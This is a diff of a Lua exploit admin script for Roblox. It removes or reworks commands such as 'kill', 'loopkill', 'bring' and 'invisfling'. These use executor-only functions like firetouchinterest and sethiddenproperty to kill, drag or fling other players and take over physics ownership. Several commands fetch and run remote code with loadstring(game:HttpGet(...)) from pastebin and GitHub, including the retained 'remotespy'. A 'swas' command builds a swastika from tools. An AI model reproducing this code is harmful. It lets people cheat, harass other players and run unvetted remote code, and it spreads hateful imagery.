@@ -2710,189 +2710,6 @@ AddCommand("hipheight", {"hh"}, "changes your hipheight to the second argument",
 	Utils.Notify(Caller, "Hipheight", "Hipheight set to " .. Humanoid.HipHeight)
 end)
 
-_L.KillCam = {};
-AddCommand("kill", {}, "kills someone", {"1", 1, 3}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local OldPos = GetRoot().CFrame
-	local Humanoid = ReplaceHumanoid();
-	local TempRespawnTimes = {}
-	for i, v in next, Target do
-		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
-	end
-	local Character = GetCharacter();
-	for i, v in next, Target do
-		if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
-			Destroy(Character);
-			Character = CWait(LocalPlayer.CharacterAdded);
-			WaitForChild(Character, "Humanoid");
-			wait()
-			Humanoid = ReplaceHumanoid();
-		end
-	end
-	if (Character.Animate) then
-		Character.Animate.Disabled = true
-	end
-	UnequipTools(Humanoid);
-
-	local TChar;
-	CThread(function()
-		for i = 1, #Target do
-			local v = Target[i]
-			TChar = GetCharacter(v);
-			if (TChar) then
-				if (isSat(v)) then
-					if (#Target == 1) then
-						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not kill!");
-					end
-					continue
-				end
-				local TargetRoot = GetRoot(v);
-				if (not TargetRoot) then
-					continue
-				end
-				if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
-					continue
-				end
-
-				local Tool = GetCorrectToolWithHandle();
-				if (not Tool) then
-					continue
-				end
-				Tool.Parent = Character
-				Tool.Handle.Size = Vector3New(4, 4, 4);
-				CFrameTool(Tool, TargetRoot.CFrame);
-				firetouchinterest(TargetRoot, Tool.Handle, 0);
-				firetouchinterest(TargetRoot, Tool.Handle, 1);
-			else
-				Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not kill!");
-			end
-		end
-	end)()
-	ChangeState(Humanoid, 15);
-	if (_L.KillCam and #Target == 1 and TChar) then
-		--Camera.CameraSubject = TChar
-	end
-	wait(.3);
-	Destroy(Character);
-	Character = CWait(LocalPlayer.CharacterAdded);
-	WaitForChild(Character, "HumanoidRootPart").CFrame = OldPos
-end)
-
-AddCommand("loopkill", {}, "loopkill loopkills a character", {3,"1"}, function(Caller, Args, CEnv)
-	local Target = GetPlayer(Args[1]);
-	for i, v in next, Target do
-		CEnv[#CEnv + 1] = v
-	end
-	repeat
-		local Character, Humanoid = GetCharacter(), GetHumanoid();
-		UnequipTools(Humanoid);
-		DisableAnimate();
-		Humanoid = ReplaceHumanoid(Humanoid);
-		ChangeState(Humanoid, 15);
-		if (isR6(Target[1])) then
-			Utils.Notify(LocalPlayer, "Loopkill", "R6 rigtype detected, it will only kill every 2 respawns!")
-		end
-		for i = 1, #Target do
-			local v = Target[i]
-			local TargetRoot = GetRoot(v)
-			local Children = GetChildren(LocalPlayer.Backpack);
-			for i2 = 1, #Children do
-				local v2 = Children[i2]
-				if (IsA(v2, "Tool")) then
-					SpoofInstance(v);
-					v2.Parent = GetCharacter();
-					local OldSize = v2.Handle.Size
-					for i3 = 1, 3 do
-						if (TargetRoot) then
-							firetouchinterest(TargetRoot, v2.Handle, 0);
-							wait();
-							firetouchinterest(TargetRoot, v2.Handle, 1);
-						end
-					end
-					v2.Handle.Size = OldSize
-				end
-			end
-		end
-		wait(.2);
-		Destroy(LocalPlayer.Character);
-		CWait(LocalPlayer.CharacterAdded);
-		WaitForChild(LocalPlayer.Character, "HumanoidRootPart");
-		wait(1);
-	until not next(LoadCommand("loopkill").CmdEnv) or not GetPlayer(Args[1])
-end)
-
-AddCommand("unloopkill", {"unlkill"}, "unloopkills a user", {3,"1"}, function(Caller, Args)
-	LoadCommand("loopkill").CmdEnv = {}
-	Utils.Notify(Caller, "Loopkill", "Disabled!")
-end)
-
-AddCommand("bring", {}, "brings a user", {1}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Target2 = Args[2] and GetPlayer(Args[2]);
-	local OldPos = GetRoot(Caller).CFrame
-	if (Caller ~= LocalPlayer and Target[1] == LocalPlayer) then
-		GetRoot().CFrame = GetRoot(Caller).CFrame * CFrameNew(-5, 0, 0);
-	else
-		local TempRespawnTimes = {}
-		for i = 1, #Target do
-			local v = Target[i]
-			TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
-		end
-		DisableAnimate();
-		ReplaceHumanoid();
-		for i, v in next, Target do
-			if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
-				Destroy(LocalPlayer.Character);
-				CWait(LocalPlayer.CharacterAdded);
-				WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
-				wait(.1);
-				ReplaceHumanoid();
-			end
-		end
-		local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
-		for i = 1, #Target do
-			local v = Target[i]
-			if (GetCharacter(v)) then
-				if (isSat(v)) then
-					if (#Target == 1) then
-						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
-					end
-					continue
-				end
-				if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
-					continue
-				end
-
-				local TargetRoot = GetRoot(v);
-				if (not TargetRoot) then
-					continue
-				end
-
-				local Tool = GetCorrectToolWithHandle();
-				if (not Tool) then
-					continue
-				end
-				Tool.Parent = GetCharacter();
-				Tool.Handle.Size = Vector3New(4, 4, 4);
-				CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
-				if (not syn) then
-					wait(.1);
-				end
-				for i2 = 1, 3 do
-					firetouchinterest(TargetRoot, Tool.Handle, 0);
-					wait();
-					firetouchinterest(TargetRoot, Tool.Handle, 1);
-				end
-			else
-				Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
-			end
-		end
-		wait(.2);
-		Destroy(LocalPlayer.Character);
-		CWait(LocalPlayer.CharacterAdded);
-		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
-	end
-end)
 
 AddCommand("remotespy", {"rspy"}, "spy remotes in game", {}, function()
 	loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
@@ -3012,52 +2829,36 @@ AddCommand("partownership", {}, "gives you ownership of unanchored parts", {}, f
 end)
 
 AddCommand("partgravity", {}, "unanchored parts zero gravity", {}, function()
-spawn(function()
-	while true do
-		game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
-		game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
-		game:GetService("RunService").Stepped:wait()
-	end
-end)
-local function zeroGrav(part)
-    if part:FindFirstChild("BodyForce") then return end
-    local temp = Instance.new("BodyForce")
-    temp.Force = part:GetMass() * Vector3.new(0,workspace.Gravity,0)
-    temp.Parent = part
-end
-
-for i,v in ipairs(workspace:GetDescendants()) do
-    if v:IsA("Part") and v.Anchored == false then
-        if not (v:IsDescendantOf(game.Players.LocalPlayer.Character)) then
-            zeroGrav(v)
-        end
-    end
-end
-
-workspace.DescendantAdded:Connect(function(part)
-    if part:IsA("Part") and part.Anchored == false then
-        if not (part:IsDescendantOf(game.Players.LocalPlayer.Character)) then
-            zeroGrav(part)
-        end
-    end
-end)
-Utils.Notify(Caller, "Partgravity", "Enabled!")	
-end)
-
-AddCommand("reanimate", {}, "reanimates your character", {3}, function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/UiDNEtL8"))()
-end)
-
-AddCommand("backpackboombox", {}, "works with r6 and r15 ", {1}, function()
-	local plr = game.Players.LocalPlayer
-	local backpack = plr.Backpack
-	local character = plr.Character
-	local Boomboxes = filter(GetChildren(LocalPlayer.Backpack), function(i, v)
-		if (Sfind(lower(v.Name), "boombox") or FindFirstChildOfClass(v.Handle, "RemoteEvent", true)) then
-			v.Name = "BoomBox"
+	spawn(function()
+		while true do
+			game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
+			game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
+			game:GetService("RunService").Stepped:wait()
 		end
 	end)
-	loadstring(game:HttpGet("https://pastebin.com/raw/fKaDCQRw"))()
+	local function zeroGrav(part)
+		if part:FindFirstChild("BodyForce") then return end
+		local temp = Instance.new("BodyForce")
+		temp.Force = part:GetMass() * Vector3.new(0,workspace.Gravity,0)
+		temp.Parent = part
+	end
+
+	for i,v in ipairs(workspace:GetDescendants()) do
+		if v:IsA("Part") and v.Anchored == false then
+			if not (v:IsDescendantOf(game.Players.LocalPlayer.Character)) then
+				zeroGrav(v)
+			end
+		end
+	end
+
+	workspace.DescendantAdded:Connect(function(part)
+		if part:IsA("Part") and part.Anchored == false then
+			if not (part:IsDescendantOf(game.Players.LocalPlayer.Character)) then
+				zeroGrav(part)
+			end
+		end
+	end)
+	Utils.Notify(Caller, "Partgravity", "Enabled!")	
 end)
 
 AddCommand("headless", {}, "removes your head", {2}, function()
@@ -3067,82 +2868,6 @@ end)
 
 AddCommand("split", {}, "splits your body in half", {4}, function()
 	game:GetService("Players").LocalPlayer.Character.UpperTorso.Waist:Destroy()
-end)
-
-AddCommand("ragdoll", {}, "makes you ragdoll", {2}, function()
-	LocalPlayer = game:GetService("Players").LocalPlayer
-	LocalPlayer.Character.Humanoid:MoveTo(LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 10)
-	LocalPlayer.Character.Humanoid.Jump = true
-	wait(0.1)
-	function Iterate(instance, func)
-		for i, v in next, instance:GetChildren() do
-			func(v)
-		end
-	end
-	limbs = {
-		["Right Leg"] = true;
-		["Right Arm"] = true;
-		["Left Leg"] = true;
-		["Left Arm"] = true;
-	}
-	Iterate(LocalPlayer.Character, function(v)
-		if v:IsA("BasePart") then
-			local attachment = Instance.new("Attachment")
-			attachment.Parent = v
-			attachment.Name = (v.Name .. "[Attachment]")
-			if limbs[v.Name] then
-				attachment.Position = Vector3.new(0, v.Size.Y/2, 0)
-			elseif v.Name == "Head" then
-				attachment.Position = Vector3.new(0, -v.Size.Y/2, 0)
-				attachment.Rotation = Vector3.new(0, 0, -90)
-			end
-		end
-	end)
-	local leftLegAttachment = Instance.new("Attachment")
-	leftLegAttachment.Position = Vector3.new(-.5, -1, 0)
-	leftLegAttachment.Rotation = Vector3.new(0, -90, 0)
-	local rightLegAttachment = Instance.new("Attachment")
-	rightLegAttachment.Position = Vector3.new(.5, -1, 0)
-	rightLegAttachment.Rotation = Vector3.new(0, -90, 0)
-	rightLegAttachment.Parent, leftLegAttachment.Parent = LocalPlayer.Character.Torso, LocalPlayer.Character.Torso
-	jointAttachments = {
-		['Head'] = {
-			['Attachment0'] = LocalPlayer.Character.Torso['NeckAttachment'];
-			['Attachment1'] = LocalPlayer.Character.Head['Head[Attachment]'];
-		};
-		['Left Arm'] = {
-			['Attachment0'] = LocalPlayer.Character.Torso['LeftCollarAttachment'];
-			['Attachment1'] = LocalPlayer.Character['Left Arm']['Left Arm[Attachment]'];
-		};
-		['Right Arm'] = {
-			['Attachment0'] = LocalPlayer.Character.Torso['RightCollarAttachment'];
-			['Attachment1'] = LocalPlayer.Character['Right Arm']['Right Arm[Attachment]'];
-		};
-		['Left Leg'] = {
-			['Attachment0'] = leftLegAttachment;
-			['Attachment1'] = LocalPlayer.Character['Left Leg']['Left Leg[Attachment]'];
-		};
-		['Right Leg'] = {
-			['Attachment0'] = rightLegAttachment;
-			['Attachment1'] = LocalPlayer.Character['Right Leg']['Right Leg[Attachment]'];
-		};
-	}
-	LocalPlayer.Character.Humanoid.PlatformStand = true
-	Iterate(LocalPlayer.Character, function(v)
-		if v:IsA("BasePart") then
-			if jointAttachments[v.Name] then
-				local ballSocketJoint = Instance.new("BallSocketConstraint")
-				ballSocketJoint.Parent = v
-				ballSocketJoint.Radius = 0.15
-				ballSocketJoint.Attachment0, ballSocketJoint.Attachment1 = jointAttachments[v.Name]['Attachment0'], jointAttachments[v.Name]['Attachment1']
-			end
-		end
-	end)
-	Iterate(LocalPlayer.Character.Torso, function(v)
-		if v:IsA("Motor") then
-			v:Remove()
-		end
-	end)
 end)
 
 AddCommand("r6", {}, "changes your humanoidrigtype to R6 if possible", {}, function()
@@ -3259,7 +2984,7 @@ AddCommand("swas", {"hail"}, "creates a swas with tools", {1}, function()
 
 	Tools[15].Grip = cf.n(6,5.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
 	Tools[15].Parent = char
-	
+
 	Utils.Notify(Caller, "Swastika", "Loaded!")
 end)
 
@@ -3318,7 +3043,7 @@ AddCommand("gun", {}, "makes your tool a gun", {1}, function()
 
 	Tools[15].Grip = cf.n(-3.5,-1,0) * cf.a(rd(10),rd(-90),rd(0))
 	Tools[15].Parent = char
-	
+
 	Utils.Notify(Caller, "Gun", "Loaded!")
 end)
 
@@ -3372,21 +3097,21 @@ AddCommand("blockholder", {}, "gives you an item to hold blocks", {}, function()
 end)
 
 AddCommand("removeconstraint", {"noconstraint"}, "makes your character impossible to ragdoll", {3}, function()
-local Player = game:GetService("Players").LocalPlayer.Character
-local antiragdoll = true
+	local Player = game:GetService("Players").LocalPlayer.Character
+	local antiragdoll = true
 
-antiragdoll = antiragdoll and function(v)
-	if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
-		v.Parent = nil
+	antiragdoll = antiragdoll and function(v)
+		if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
+			v.Parent = nil
+		end
 	end
-end
 
-if antiragdoll then
-	for i, v in pairs(Player:GetDescendants()) do
-		antiragdoll(v)
+	if antiragdoll then
+		for i, v in pairs(Player:GetDescendants()) do
+			antiragdoll(v)
+		end
+		Player.DescendantAdded:Connect(antiragdoll)
 	end
-	Player.DescendantAdded:Connect(antiragdoll)
-end
 	Utils.Notify(Caller, "Constraints", "Removed!")
 end)
 
@@ -4179,63 +3904,6 @@ AddCommand("2006animations", {"2006anims"}, "old roblox animations", {2}, functi
 	Utils.Notify(Caller, "2006animations", "Loaded!")
 end)
 
-AddCommand("customanimation", {"customanim"}, "plays an animation id", {3}, function(Caller, Args)		
-	loadstring(game:HttpGet("https://pastebin.com/raw/UiDNEtL8"))()
-	local anim = tonumber(Args[1])
-	local id = anim;
-	local kfs = game:GetObjects('rbxassetid://' .. tostring(id))[1];
-	local poses = {};
-	local frames = {};
-	local plr = game.Players.LocalPlayer;
-	local chr = plr.Character 
-	local hum = chr.Humanoid;
-	for i, v in pairs(kfs:GetChildren()) do
-		table.insert(frames, v.Time)
-		poses[v.Time] = {};
-		for o, b in pairs(v:GetDescendants()) do
-			b.Parent = v;
-			table.insert(poses[v.Time], b);
-		end
-	end
-	hum.Animator.Parent = nil;
-	for i, v in pairs(hum:GetPlayingAnimationTracks()) do
-		v:Stop();
-	end
-	function swait(n)
-		if n > 1 then for i = 1, n do
-				game:GetService("RunService").Heartbeat:Wait();
-			end elseif n == 1 then game:GetService("RunService").Heartbeat:Wait() elseif n == 0 then game:GetService("RunService").RenderStepped:Wait() end
-	end
-	local timex = 2;
-	local run = true;
-	spawn(function() hum.Died:Connect(function() run = false print'stop' end) end);
-	while run do
-		for i, v in pairs(frames) do
-			swait(timex);
-			for o, b in pairs(poses[v]) do
-				if b.Name == 'Left Leg' then
-					chr.Torso['Left Hip'].Transform = b.CFrame;
-				end
-				if b.Name == 'Right Leg' then
-					chr.Torso['Right Hip'].Transform = b.CFrame;
-				end
-				if b.Name == 'Left Arm' then
-					chr.Torso['Left Shoulder'].Transform = b.CFrame;
-				end
-				if b.Name == 'Right Arm' then
-					chr.Torso['Right Shoulder'].Transform = b.CFrame;
-				end
-				if b.Name == 'Torso' then
-					chr.HumanoidRootPart['RootJoint'].Transform = b.CFrame;
-				end
-				if b.Name == 'Head' then
-					chr.Torso['Neck'].Transform = b.CFrame;
-				end
-			end
-		end
-	end
-end)
-
 AddCommand("dance", {}, "plays a random dance animation", {3}, function()
 	local Humanoid = game:FindService("Players").LocalPlayer.Character.Humanoid
 	local Player = game:GetService("Players").LocalPlayer
@@ -4331,270 +3999,30 @@ end)
 
 AddCommand("antifling", {}, "can't be flinged ", {}, function()
 	repeat task.wait() until game:IsLoaded()	
-Player = game.Players.LocalPlayer
-local Players = game:GetService("Players")
-            plrs = Players
-            function nocollision(prt, plr)
-                for i, v in pairs(plr:GetDescendants()) do
-                    if v:IsA("BasePart") then
-                        e = Instance.new("NoCollisionConstraint", v)
-                        e.Part0 = v
-                        e.Part1 = prt
-                    end
-                end
-            end
-            for i, yes in pairs(Player.Character:GetDescendants()) do
-                if yes:IsA("BasePart") then
-                    if yes:IsA("BasePart") then
-                        for i, v in pairs(plrs:GetDescendants()) do
-                            if v:IsA("Player") then
-                                nocollision(yes, v.Character)
-                            end
-                        end
-                    end
-                end
-            end
-    Utils.Notify(Caller, "Antifling", "Enabled!")
-end)
-
-AddCommand("invisfling", {}, "invisible fling block", {3}, function()
-
-Utils.Notify(Caller, "Invisiblefling", "Loading...")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-
-if not getgenv().Network then
-	getgenv().Network = {
-		BaseParts = {};
-		FakeConnections = {};
-		Connections = {};
-		Output = {
-			Enabled = true;
-			Prefix = "[NETWORK] ";
-			Send = function(Type,Output,BypassOutput)
-				if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
-					if Network["Output"].Enabled == true or BypassOutput == true then
-						Type(Network["Output"].Prefix..Output);
-					end;
-				elseif Network["Output"].Enabled == true then
-					error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
-				end;
-			end;
-		};
-		CharacterRelative = false;
-	}
-
-	Network["Output"].Send(print,": Loading.")
-	Network["Velocity"] = Vector3.new(14.46262424,14.46262424,14.46262424); --exactly 25.1 magnitude
-	Network["RetainPart"] = function(Part,ReturnFakePart) --function for retaining ownership of unanchored parts
-		assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be a BasePart which is a descendant of workspace.")
-		assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (ReturnFakePart) must be a boolean or nil.")
-		if not table.find(Network["BaseParts"],Part) then
-			if Network.CharacterRelative == true then
-				local Character = LocalPlayer.Character
-				if Character and Character.PrimaryPart then
-					local Distance = (Character.PrimaryPart.Position-Part.Position).Magnitude
-					if Distance > 1000 then
-						Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
-						return false
+	Player = game.Players.LocalPlayer
+	local Players = game:GetService("Players")
+	plrs = Players
+	function nocollision(prt, plr)
+		for i, v in pairs(plr:GetDescendants()) do
+			if v:IsA("BasePart") then
+				e = Instance.new("NoCollisionConstraint", v)
+				e.Part0 = v
+				e.Part1 = prt
+			end
+		end
+	end
+	for i, yes in pairs(Player.Character:GetDescendants()) do
+		if yes:IsA("BasePart") then
+			if yes:IsA("BasePart") then
+				for i, v in pairs(plrs:GetDescendants()) do
+					if v:IsA("Player") then
+						nocollision(yes, v.Character)
 					end
-				else
-					Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
-					return false
 				end
 			end
-			table.insert(Network["BaseParts"],Part)
-			Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
-			if ReturnFakePart == true then
-				return FakePart
-			end
-		else
-			Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
-			return false
 		end
 	end
-
-	Network["RemovePart"] = function(Part) --function for removing ownership of unanchored part
-		assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
-		local Index = table.find(Network["BaseParts"],Part)
-		if Index then
-			table.remove(Network["BaseParts"],Index)
-			Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
-		else
-			Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
-		end
-	end
-
-	Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
-	for _,Event in pairs({RunService.Stepped,RunService.Heartbeat}) do
-		Event:Connect(function()
-			return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
-		end)
-	end
-
-	Network["PartOwnership"] = {};
-	Network["PartOwnership"]["PreMethodSettings"] = {};
-	Network["PartOwnership"]["Enabled"] = false;
-	Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
-		if Network["PartOwnership"]["Enabled"] == false then
-			Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
-			Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
-			LocalPlayer.ReplicationFocus = workspace
-			Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
-			Network["PartOwnership"]["Connection"] = Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
-				sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
-				for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
-					coroutine.wrap(function()
-						if Part:IsDescendantOf(workspace) then
-							if Network.CharacterRelative == true then
-								local Character = LocalPlayer.Character;
-								if Character and Character.PrimaryPart then
-									local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
-									if Distance > 1000 then
-										Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
-										Lost = true;
-										Network["RemovePart"](Part)
-									end
-								else
-									Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
-								end
-							end
-							Part.Velocity = Network["Velocity"]+Vector3.new(0,math.cos(tick()*10)/100,0) --keep network by sending physics packets of 30 magnitude + an everchanging addition in the y level so roblox doesnt get triggered and fuck your ownership
-						else
-							Network["RemovePart"](Part)
-						end
-					end)()
-				end
-			end)
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
-		else
-			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
-		end
-	end)
-	Network["PartOwnership"]["Disable"] = coroutine.create(function()
-		if Network["PartOwnership"]["Connection"] then
-			Network["PartOwnership"]["Connection"]:Disconnect()
-			LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
-			sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
-			Network["PartOwnership"]["PreMethodSettings"] = {}
-			for _,Part in pairs(Network["BaseParts"]) do
-				Network["RemovePart"](Part)
-			end
-			Network["PartOwnership"]["Enabled"] = false
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
-		else
-			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
-		end
-	end)
-	Network["Output"].Send(print,": Loaded.")
-end
-
-coroutine.resume(Network["PartOwnership"]["Enable"])
-
-player = game:GetService("Players").LocalPlayer
-input = game:GetService("UserInputService")
-character = player.Character
-humanoid = character.Humanoid
-root = character.HumanoidRootPart
-camera = workspace.CurrentCamera
-fling_part = character:FindFirstChildOfClass("Accessory").Handle 
-
-torso = "UpperTorso"
-if humanoid.RigType == Enum.HumanoidRigType.R6 then
-	fling_part.Mesh:Destroy()
-	torso = "Torso"
-end
-
-local lp = game.Players.LocalPlayer -- local player var
-local char = lp.Character -- char var
-
-lp.Character = nil -- nil character for pdeath
-lp.Character = char -- newvar
-
-local hrp = char:FindFirstChild("HumanoidRootPart") -- hrp check
-if hrp == nil then return end -- return if no hrp
-
-wait(game.Players.RespawnTime + .3) -- nil wait
-
-hrp:Destroy() -- rip hrp
-char[torso]:Destroy() -- rip torso
-local clone = char["Body Colors"]:Clone() -- body colors clone
-char["Body Colors"]:Destroy() -- delete any instances from char that replicates deletion
-clone.Parent = char -- parent back in clone in case some script uses it
-
-for i,v in pairs(character:GetDescendants()) do
-    if v:IsA("BasePart") and v ~= fling_part then
-        v:Destroy()
-    end
-end
-
-camera.CameraSubject = fling_part
-
-current_position = fling_part.Position + Vector3.new(0,10,0)
-
-fling_part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
-
-Network.RetainPart(fling_part)
-
-local resetBindable = Instance.new("BindableEvent")
-resetBindable.Event:connect(function()
-    fling_part:Destroy()
-end)
-
-game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)
-
-player.DevEnableMouseLock = false
-
-coroutine.wrap(function()
-	while task.wait() do
-        if fling_part.Parent == nil then
-            humanoid:Destroy()
-            camera:Destroy()
-            game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
-            player.DevEnableMouseLock = true
-            vbreak = true
-            break
-        end
-		fling_part.Position = current_position
-		fling_part.Velocity = Vector3.new(0,0,30)
-		fling_part.RotVelocity = Vector3.new(9e9,9e9,9e9)
-	end
-end)()
-
-speed = 0.75
-
-while wait() do
-    if vbreak == true then
-        break
-    end
-    camera.CameraSubject = fling_part
-	if input:IsKeyDown(Enum.KeyCode.D) then
-		current_position += camera.CFrame.RightVector * speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.A) then
-		current_position += camera.CFrame.RightVector * -speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.W) then
-		current_position += camera.CFrame.LookVector * speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.S) then
-		current_position += camera.CFrame.LookVector * -speed
-	end
-    if input:IsKeyDown(Enum.KeyCode.E) then
-	current_position += camera.CFrame.UpVector * speed
-    end
-    if input:IsKeyDown(Enum.KeyCode.Q) then
-        current_position += camera.CFrame.UpVector * -speed
-    end
-    if input:IsKeyDown(Enum.KeyCode.LeftShift) then do
-        speed = 1.5
-	end else
-        speed = 0.75
-    end
-end
-
+	Utils.Notify(Caller, "Antifling", "Enabled!")
 end)
 
 AddCommand("touchfling", {}, "enables invisible forcefield", {}, function()
@@ -4647,46 +4075,46 @@ AddCommand("touchfling", {}, "enables invisible forcefield", {}, function()
 	Utils.Notify(Caller, "Touchfling", "Enabled!")
 end)
 
-AddCommand("clothingrescale", {}, "streches your layered clothing", {4}, function()
-        local swimming = false
-local RunService = game:GetService("RunService")
-oldgrav = workspace.Gravity
-workspace.Gravity = 0
-local char = game.Players.LocalPlayer.Character
-local swimDied = function()
-workspace.Gravity = oldgrav
-swimming = false
-end
-local Humanoid = char:FindFirstChildWhichIsA("Humanoid")
-gravReset = Humanoid.Died:Connect(swimDied)
-local enums = Enum.HumanoidStateType:GetEnumItems()
-table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
-for i, v in pairs(enums) do
-Humanoid:SetStateEnabled(v, false)
-end
-Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
-swimbeat = RunService.Heartbeat:Connect(function()
-pcall(function()
-char.HumanoidRootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputService:IsKeyDown(Enum.KeyCode.Space)) and char.HumanoidRootPart.Velocity or Vector3.new())
-end)
-end)
-swimming = true
-local Clip = false
-wait(0.1)
-local function NoclipLoop()
-if Clip == false and char ~= nil then
-for _, child in pairs(char:GetDescendants()) do
-if child:IsA("BasePart") and child.CanCollide == true then
-child.CanCollide = false
-end
-end
-end
-end
-Noclipping = RunService.Stepped:Connect(NoclipLoop)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
-end)
+--[[AddCommand("clothingrescale", {}, "streches your layered clothing", {4}, function()
+	local swimming = false
+	local RunService = game:GetService("RunService")
+	oldgrav = workspace.Gravity
+	workspace.Gravity = 0
+	local char = game.Players.LocalPlayer.Character
+	local swimDied = function()
+		workspace.Gravity = oldgrav
+		swimming = false
+	end
+	local Humanoid = char:FindFirstChildWhichIsA("Humanoid")
+	gravReset = Humanoid.Died:Connect(swimDied)
+	local enums = Enum.HumanoidStateType:GetEnumItems()
+	table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
+	for i, v in pairs(enums) do
+		Humanoid:SetStateEnabled(v, false)
+	end
+	Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
+	swimbeat = RunService.Heartbeat:Connect(function()
+		pcall(function()
+			char.HumanoidRootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputService:IsKeyDown(Enum.KeyCode.Space)) and char.HumanoidRootPart.Velocity or Vector3.new())
+		end)
+	end)
+	swimming = true
+	local Clip = false
+	wait(0.1)
+	local function NoclipLoop()
+		if Clip == false and char ~= nil then
+			for _, child in pairs(char:GetDescendants()) do
+				if child:IsA("BasePart") and child.CanCollide == true then
+					child.CanCollide = false
+				end
+			end
+		end
+	end
+	Noclipping = RunService.Stepped:Connect(NoclipLoop)
